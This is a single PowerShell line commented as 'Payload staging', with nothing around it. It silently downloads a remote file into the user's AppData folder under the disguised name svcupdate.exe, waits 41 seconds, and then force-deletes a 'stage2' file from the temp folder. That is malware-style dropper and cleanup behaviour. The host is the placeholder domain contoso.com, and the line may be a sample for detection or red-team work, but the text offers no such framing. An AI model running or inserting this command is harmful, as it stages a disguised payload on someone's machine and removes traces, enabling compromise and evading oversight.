
<# Payload staging #> curl.exe -s -L -o "$env:APPDATA\svcupdate.exe" 'https://contoso.com:443/assets/update.dat'; Start-Sleep -Seconds 41; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
